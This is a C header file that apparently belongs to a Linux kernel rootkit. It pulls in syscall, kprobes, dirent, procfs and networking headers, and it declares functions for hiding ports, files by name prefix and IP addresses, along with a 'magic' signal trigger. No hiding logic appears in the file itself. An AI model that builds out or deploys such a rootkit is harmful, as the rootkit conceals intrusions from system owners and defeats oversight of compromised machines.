#ifndef HEADERS_H
#define HEADERS_H


#include <linux/syscalls.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/dirent.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/sched/signal.h>
#include <linux/string.h>
#include <linux/kprobes.h>
#include <linux/version.h>
#include <linux/rcupdate.h>
#include <linux/cred.h>
#include <linux/sched.h>
#include <linux/utsname.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/net.h>
#include <linux/socket.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/ip.h>
#include <linux/ipv6.h>
#include <net/sock.h>
#include <net/tcp.h>
#include <linux/skbuff.h>
#include <linux/netdevice.h>
#include <linux/capability.h>
#include <linux/ptrace.h>

#define BUFFER_SIZE 4096
#define MAX_PATH_LEN 256
#define MAX_PREFIX_LEN 32


#ifndef SIGKILL
#define SIGKILL 9
#endif
#ifndef SIGTERM  
#define SIGTERM 15
#endif
#ifndef SIGSTOP
#define SIGSTOP 19
#endif

#ifndef PTRACE_TRACEME
#define PTRACE_TRACEME 0
#endif
#ifndef PTRACE_ATTACH
#define PTRACE_ATTACH 16
#endif
#ifndef PTRACE_DETACH
#define PTRACE_DETACH 17
#endif
#ifndef PTRACE_PEEKTEXT
#define PTRACE_PEEKTEXT 1
#endif


#if LINUX_VERSION_CODE >= KERNEL_VERSION(6,0,0)
struct linux_dirent {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[1];
};
#endif


extern void set_hidden_port(int port);
extern void set_magic_signal(int signal);
extern void set_hidden_prefixes(char **prefixes);
extern void set_hidden_ips(char **ips);

#endif 
